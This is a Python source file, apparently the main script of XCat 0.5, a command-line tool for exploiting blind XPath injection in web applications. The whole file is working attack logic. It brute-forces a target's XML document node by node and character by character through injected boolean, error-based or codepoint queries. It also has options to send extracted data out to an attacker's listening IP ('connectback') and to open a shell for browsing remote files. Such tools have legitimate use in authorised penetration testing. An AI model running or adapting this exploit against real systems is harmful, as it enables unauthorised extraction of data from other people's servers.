# XCat
# Command line utility for extracting XML documents through XPath injection vulnerabilities
import argparse
from twisted.internet import reactor, defer
from lib import SimpleXMLWriter, payloads
import string
import sys
__VERSION__ = 0.5

writer = SimpleXMLWriter.XMLWriter(sys.stdout)

@defer.inlineCallbacks
def Count(payloads, node, integer=False):
    global args

    if integer:
        search_query = "GET_COUNT_LENGTH"
        specific_query ="NODE_COUNT"
    else:
        search_query = "GET_CONTENT_LENGTH"
        specific_query = "NODEVALUE_LENGTH"

    # Check if its nill first
    test = yield payloads.RunQuery(payloads.Get(specific_query)(node=node, count=0))
    if test:
        defer.returnValue(0)

    # Chop it into sections
    MIN, MAX = (0, 10)
    for i in xrange(args.step_size):
        r = yield payloads.RunQuery(payloads.Get(search_query)(node=node,min=MIN,max=MAX))
        if not r:
            MIN+=10
            MAX+=10
        else:
            tlist = []
            for i in xrange(MIN, MAX+1):
                tlist.append(payloads.RunQuery(payloads.Get(specific_query)(node=node,count=i)))
            results = yield defer.gatherResults(tlist)
            if not any(results):
                defer.returnValue(0)
            defer.returnValue(MIN+results.index(True))


@defer.inlineCallbacks
def GetCharacters(payloads, node, size=0, count_it=False):
    if count_it:
        size = yield Count(payloads, node=node)
        #raw_input("\nGot size %s for node %s"%(size, node))

    returner = []
    _counter = 0
    _found = False
    while True:
        _counter+=1
        if not size == 0:
            if _counter > size:
                break

        _found = False
        for char in (string.ascii_letters + string.digits + " "):
            r = yield payloads.RunQuery(payloads.Get("GET_NODE_CODEPOINT")(node=node, count=_counter, value=ord(char)))
            if r:
                returner.append(char)
                _found = True
                break

        if not _found:
            break

    defer.returnValue("".join(returner))


@defer.inlineCallbacks
def GetXMLFromNode(payloads, node):
    global args
    #print "Node: %s"%node
    node_name = yield GetCharacters(payloads, "name(%s)"%node, count_it=True)
    attribute_count = yield Count(payloads, node=node+"/@*", integer=True)
    attributes = {}
    if attribute_count:
        for i in xrange(1, attribute_count+1):
            attribute = yield GetCharacters(payloads, "name(%s)"%(node+"/@*[%s]"%i))
            value     = yield GetCharacters(payloads, node+"/@*[%s]"%i)
            #raw_input("Got attribute '%s' value '%s'"%(attribute, value))
            attributes[attribute] = value

    writer.start(node_name, attrib=attributes)

    if not args.schema_only:
        commentCount = yield Count(payloads, node+"/comment()", integer=True)
        if commentCount:
            for i in xrange(1, commentCount+1):
                comment = yield GetCharacters(payloads, node+"/comment()[%s]"%i, count_it=True)
                if comment:
                    writer.comment(comment)

    child_node_count = yield Count(payloads, node=node+"/*", integer=True)
    #print "Child node count: %s"%child_node_count
    if child_node_count:
        for i in xrange(1, child_node_count+1):
            yield GetXMLFromNode(payloads, node+"/*[%s]"%i)

    if not args.schema_only:
        value = yield GetCharacters(payloads, node+"/text()", count_it=True)
        if value:
            writer.data(value)

    writer.end()

@defer.inlineCallbacks
def Main(args):
    global payloads
    payloads = payloads.PayloadMaker(args)

    if args.xversion == "auto":
        xversion = yield payloads.DetectXPathVersion()
        sys.stderr.write("Detected XPath version %s\n"%xversion)

    if args.error_keyword and args.xversion == "1":
        sys.stderr.write("Error based detection is unavailable when attacking targets running XPath 1.0\n")
        sys.exit(1)

    if args.connectback and not args.connectback_ip:
        sys.stderr.write("Error: You must specify a IP when using connectback\n")
        sys.exit(1)

    sys.stderr.write("Exploiting...\n")
    yield GetXMLFromNode(payloads, "/*")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Read a remote XML file through an XPath injection vulnerability")
    parser.add_argument("--method", help="HTTP method to send", action="store",
        default="GET", choices=["GET","POST"], dest="http_method")
    parser.add_argument("--arg", help="POST argument(s) to send. The payload will be appended", type=str, action="store",
        dest="post_argument")

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--true", help="Keyword that if present indicates a success", dest="true_keyword")
    group.add_argument("--false", help="Keyword that if present indicates a failure (And if not present indicates a success)", dest="false_keyword")
    group.add_argument("--error", help="Keyword that if present indicates a server error. Used for exploiting injection vectors that give no output, but can be caused to error",
        dest="error_keyword")

    parser.add_argument("--schema_only", help="Only extract the node names and no data", action="store_true", dest="schema_only")
    parser.add_argument("--quotecharacter", help="The quote character we will use to inject (normally' or \")", default="\"", dest="quote_character")
    parser.add_argument("--executequery", help="If given recurse through this query and extract the results, instead of searching from the root node. use $COUNT to insert the current node we are looking at. eg: /users/user[$COUNT]/password",
        default="", dest="executequery")

    parser.add_argument("--max_search", help="The max number of characters to search to before giving up", dest="search_limit", type=int, default=20)
    parser.add_argument("--timeout", help="Socket timeout to set", type=int, default=5, dest="timeout", action="store")
    parser.add_argument("--threadpool", help="Thread pool size for large textual items", type=int, default=10, dest="poolsize", action="store")
    parser.add_argument("--stepsize", help="When counting text contents (which could be very large) this is the max number of characters to count up to, times by ten",
        type=int, default=10, dest="step_size", action="store")
    parser.add_argument("--normalize", help="Normalize unicode", choices=["NFD","NFC","NFDK","NFKC"], action="store", dest="normalize_unicode")
    parser.add_argument("--xversion", help="The xpath version to use", choices=["1","2","auto"], default="auto", action="store",dest="xversion")
    parser.add_argument("--lowercase", help="Speed up retrieval time by making all text lowercase before searching. Xpath 2.0 only",
        default=False, dest="lowercase", action="store_true")
    parser.add_argument("--regex", help="Use Regex to reduce the search space of text. Xpath 2.0 only",
        default=False, dest="use_regex", action="store_true")
    group2 = parser.add_mutually_exclusive_group()
    #group2.add_argument("--dns", help="Experimental: Use DNS requests to transfer data. XPath 2.0 only. This parameter is the end of the hostname. Only works with alphanumeric characters, 64character limit (in total).",
    #                             action="store", dest="dns_location")
    group2.add_argument("--connectback", help="Use a clever technique to deliver the XML document data over HTTP to xcat. Requires a public IP address and port listening permissions",
        action="store_true", dest="connectback")

    parser.add_argument("--connectbackip", help="IP Address to listen on for connectback", action="store", dest="connectback_ip")
    parser.add_argument("--connectbackport", help="The port to listen on for connectback data", action="store", dest="connectback_port", default=80, type=int)

    parser.add_argument("--notfoundstring", help="The character to place when a character cannot be found in the searchspace", action="store", dest="notfoundchar", default="?")
    parser.add_argument("--fileshell", help="Launch a shell for browing remote files", action="store_true", dest="fileshell")
    parser.add_argument("--useragent", help="User agent to use", action="store", dest="user_agent", default="XCat %s"%__VERSION__)
    parser.add_argument("URL", action="store")
    args = parser.parse_args()

    if not any([args.false_keyword, args.true_keyword, args.error_keyword]):
        sys.stderr.write("Error: You must supply a false, true or error keyword\n")
        sys.exit(1)

    if args.http_method == "POST":
        if not args.post_argument:
            sys.stderr.write("Error: You must supply some POST arguments if you are making a POST request!\n")
            sys.exit(1)


    if args.true_keyword:
        args.lookup = True
    else:
        args.lookup = False

    Main(args)

    reactor.run()